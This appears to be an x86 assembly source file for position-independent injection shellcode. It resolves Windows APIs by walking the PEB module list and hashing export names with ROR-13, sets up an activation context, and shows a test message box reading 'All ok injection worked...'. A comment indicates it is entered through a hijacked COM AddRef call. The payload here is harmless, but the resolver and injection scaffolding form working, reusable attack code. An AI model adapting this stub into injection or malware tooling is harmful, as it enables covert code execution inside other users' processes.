                        .586p
                        .model  flat, stdcall
                        option  casemap:none

include                 pe64.inc
                        
                        .code
                        assume  fs:nothing
ExportShellcode         proc    pdwSize:dword
                        mov     eax, pdwSize
                        mov     dword ptr[eax], shellcode_end - shellcode
                        mov     eax, offset shellcode
                        ret
ExportShellcode         endp
 

shellcode:              ;jmp     $
                        ;int     3
                        pushad
                        call    __delta
__delta:                pop     ebp
                        
                        ;is there ActivationContextStack ??                  
                        cmp     dword ptr fs:[01A8h], 0
                        jne     __noactivation_needed
                        
                        ;Nope, create one...
                        ;by calling ntdll!RtlAllocateActivationContextStack
                        push    00135A08Ah
                        call    get_api_mshash
                        test    eax, eax
                        jz      __noactivation_needed
                        mov     ecx, dword ptr fs:[18h]
                        lea     ecx, [ecx+01A8h]
                        
                        push    ecx
                        call    eax
__noactivation_needed:                        
                        push    0BC4DA2A8h
                        call    get_api_mshash
                        
                        xor     edx, edx
                        push    edx
                        lea     ecx, [ebp+(msgtitle - __delta)]
                        push    ecx
                        lea     ecx, [ebp+(msgtext - __delta)]
                        push    ecx
                        push    edx
                        call    eax
                        
                        popad
                        ;coming from AddRef :)
                        ret     04h
                        
                        
                        
msgtext                 db      "All ok injection worked...", 0
msgtitle                db      "oki...", 0                        

get_api_mshash:         push    esi
                        push    ebx
                        push    edi
                        mov     ebx, [esp+10h]
                        mov     esi, dword ptr fs:[30h]	        
                        mov     esi, dword ptr [esi+0ch]        
                        lea     edi, dword ptr [esi+1ch]
                        mov     esi, dword ptr [esi+1ch]        

__loop_api1:            cmp     esi, edi
                        jz      __exit_gam
                        push    ebx
                        push    dword ptr[esi+08h]                                                 
                        call    getprocaddress
                        mov     esi, dword ptr[esi]
                        test    eax, eax
                        jz      __loop_api1
__exit_gam:
                        pop     edi
                        pop     ebx
                        pop     esi
                        ret     04

getprocaddress:
                        pushad
                        xor     eax, eax
                        mov     ebx, dword ptr[esp+24h]
                        test    ebx, ebx
                        jz      __exit0
                        mov     edi, dword ptr[ebx+3ch]
                        add     edi, ebx
                        mov     eax, [edi.peheader.pe_export]
                        test    eax, eax
                        jz      __exit0
                        xchg    edi, eax
                        add     edi, ebx
                        xor     ecx, ecx
                        mov     ebp, [edi.export_directory.ed_addressofnames]
                        add     ebp, ebx
__loop_names:           mov     esi, [ebp]
                        add     esi, ebx
                        xor     eax, eax
                        cdq
__hash_name:            lodsb
                        test    al, al
                        jz      __cmphash
                        ror     edx, 0dh
                        add     edx, eax
                        jmp     __hash_name
__cmphash:              cmp     edx, [esp+28h]
                        je      __getapi                        
                        add     ebp, 4
                        inc     ecx
                        cmp     ecx, [edi.export_directory.ed_numberofnames]
                        jne     __loop_names
                        xor     eax, eax
                        jmp     __exit0                 
__getapi:               mov     esi, [edi.export_directory.ed_addressofordinals]
                        add     esi, ebx
                        movzx   esi, word ptr[esi+ecx*2]
                        mov     eax, [edi.export_directory.ed_addressoffunctions]
                        add     eax, ebx
                        mov     eax, [eax+esi*4]
                        add     eax, ebx
__exit0:
                        mov     [esp+1ch], eax       
                        popad
                        ret     8
                        
contextaddress          dd      ?
shellcode_end:
                        end                        
                        
                        
                        
                        